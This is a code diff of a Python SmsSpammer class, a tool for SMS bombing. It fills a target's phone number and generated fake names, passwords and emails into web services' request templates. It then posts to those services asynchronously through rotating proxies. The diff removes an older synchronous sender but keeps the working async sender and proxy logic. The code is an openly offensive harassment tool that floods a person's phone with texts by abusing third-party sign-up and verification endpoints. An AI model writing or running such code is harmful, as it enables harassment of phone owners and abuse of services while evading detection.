@@ -25,19 +25,6 @@ class SmsSpammer:
                     phone = '7'+phone
             return phone
 
-    async def sendSms(self, websiteData):
-        print("started")
-        try:
-            if websiteData["kind"] == "data":
-                requests.post(websiteData["url"], data=websiteData["data"], proxies=self.proxies, timeout=self.timeout)
-            elif websiteData["kind"] == "json":
-                requests.post(websiteData["url"], json=websiteData["data"], proxies=self.proxies, timeout=self.timeout)
-            elif websiteData["kind"] == "params":
-                requests.post(websiteData["url"], params=websiteData["data"], proxies=self.proxies, timeout=self.timeout)
-            print("yes")
-        except:
-            print("no")
-            self.timeoutCounter = self.timeoutCounter + 1
 
     def setProxies(self, new_proxies):
         if self.proxies != new_proxies:
@@ -50,8 +37,7 @@ class SmsSpammer:
             self.name = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
             self.password = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
             self.email = "{}@gmail.com".format(self.name)
-        # f = open("src/servicesList.json","r")
-        # services = f.read()
+
         services = allServices
         services = services.replace("$phone$",self.phoneNumber)
         services = services.replace("$name$",self.name)
@@ -60,7 +46,6 @@ class SmsSpammer:
         self.servicesURLs = json.loads(services)
         
     async def asyncSendSMS(self,session, websiteData,proxy, i):
-        # print("started: "+str(i)+" ,proxy:"+proxy)
         try:
             if websiteData["kind"] == "data":
                 await session.post(websiteData["url"], data=websiteData["data"], proxy="http://"+proxy, timeout=self.timeout)
@@ -69,7 +54,7 @@ class SmsSpammer:
             elif websiteData["kind"] == "params":
                 await session.post(websiteData["url"], params=websiteData["data"], proxy="http://"+proxy, timeout=self.timeout)
             return 1
-        except Exception as e:
+        except:
             self.timeoutCounter = self.timeoutCounter + 1
             return 2
 
